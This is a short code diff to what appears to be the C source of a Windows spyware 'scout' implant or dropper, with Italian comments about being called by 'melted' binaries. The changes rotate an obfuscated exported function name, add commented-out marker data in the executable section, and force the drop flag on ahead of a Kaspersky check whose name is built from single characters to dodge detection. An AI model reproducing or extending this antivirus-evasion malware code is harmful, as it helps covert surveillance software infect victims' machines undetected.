@@ -37,7 +37,7 @@ HANDLE hScoutSharedMemory;
 //PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
 //__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro)
 //__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
-__declspec(dllexport) PWCHAR gntuoie2nv(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR sfjRRg43(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
@@ -54,6 +54,8 @@ __declspec(dllexport) PWCHAR gntuoie2nv(PULONG pSynchro) // questa viene richiam
 	return pScoutName;
 }
 
+//#pragma section(".text", read,exec)
+//__declspec(allocate(".text"))  DWORD ewiogh[1024] = {0xf1caf1ca, 0xf1caf1ca};
 
 int CALLBACK WinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
@@ -131,6 +133,8 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	// do not drop if kaspersky x86
 	BOOL bIsWow64, bIsOS64, bDrop;
 	IsX64System(&bIsWow64, &bIsOS64);
+
+	bDrop = TRUE;
 	if (!bIsOS64)
 	{
 		WCHAR pKasp[] = { L's', L'p', L'e', L'r', L's', L'k', L'y', 0x0 };
